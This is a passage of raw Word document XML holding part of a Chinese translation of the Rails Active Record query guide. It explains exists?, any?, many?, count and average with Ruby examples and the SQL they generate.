          <w:p w14:paraId="305D94BB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1423406285"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.exists?(1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="03A74DF4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>exists?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法可以接受多个 id 作为参数，但是注意只要任何一条记录存在它都会返回 true 。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2976"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="1C34C1A6" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="44663EC4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.exists?(1,2,3)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2182B6BA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># 或者</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EA8C906" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.exists?([1,2,3]}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2EF5C84F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">直接在一个 model 或者 relation 实例上调用不带参数的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>exists?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法也是可以的。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5304"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="27D5E393" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="261251B9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="134836572"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.where(:first_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Ryan').exists?</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="53884F2D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">上面的例子中，如果至少有一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first_name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 为 ‘Ryan’ 的 client 记录存在，那就会返回 true ，否则就返回 false 。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1896"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="02018ECA" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F5243D8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="135267966"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.exists?</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="10CF7C48" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>client</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 表为空，就返回 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ，否则返回 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02DF7FAC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">你也可以使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>any?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 或者 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>many?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 来检查一个 model 或者 relation 的存在性。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4464"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="140887AA" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5331A5BA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># model</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32AFABE9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post.any?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1862E43C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post.many?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24DA9C6D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71AFD823" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># 已定义的作用域</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0203AF0E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post.recent.any?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="625F54C5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post.recent.many?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E43FB9B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11186BB0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># relation</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70E7F482" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post.where(:published</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true).any?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D9C1A90" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post.where(:published</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true).many?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38B3B931" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61D44D16" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># association</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="289E3F5A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post.first.categories.any?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59F12AEC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post.first.categories.many?</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="264935C3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>21 计算</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A04BBC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>这个章节在序言中使用 count 方法作为例子，但是这些操作适用于所有子节的方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D865997" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>所有的计算方法都直接在 model 上</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5376"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="340A74A4" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0627DE16" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.count</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="427F9881" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># SELECT count(*) AS count_all FROM clients</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="10298103" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>或者 relation 实例对象上</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2D810E49" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="234703DE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.where(:first_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Ryan').count</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="766C22D4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># SELECT count(*) AS count_all FROM clients WHERE (first_name = 'Ryan')</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4B0DD651" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE3CC6C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>你也可以在 relation 实例对象上使用很多查找方法来做复杂的计算：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="269C824E" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7A2633C2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="423651809"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.includes("orders").where(:first_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Ryan', :orders= =&gt; {:status</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'received'}).count</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5D3FA24E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>它会生成如下语句：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7751"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="09782F86" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6D427E79" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>count(DISTINCT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clients.id) AS</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>count_all FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clients</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2AFAD6A1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  LEFT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>OUTER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>JOIN</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders ON</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders.client_id = client.id WHERE</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74089CE7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  (clients.first_name = 'Ryan'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>AND</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders.status = 'received')</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="62C3E6D8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>21.1 次数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="107BCB08" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你想知道你的数据表有多少条记录，你可以调用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Client.count</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。如果你想更加明确一点，找出数据库中所有的 client 当前的年龄，你可以用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Client.count(:age)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7828AE38" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">想知道具体用法，可以参见父章节： </w:t>
      </w:r>
      <w:hyperlink r:id="rId280" w:anchor="21" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>计算</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB0A303" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>21.2 平均值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="526A8FEB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你想知道你的数据库中一些数据的平均值，你可以在数据表对应的类上使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>average</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法。这个方法大致像下面这样调用：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3816"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2F710740" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D1FFE70" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1473214581"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.average("orders_count")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1E2FDFB2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>它会返回一个数字（可能是一个浮点数，如： 3.14159265 ），代表这块区域的平均值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA5610B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">想知道具体用法，可以参见父章节： </w:t>
      </w:r>
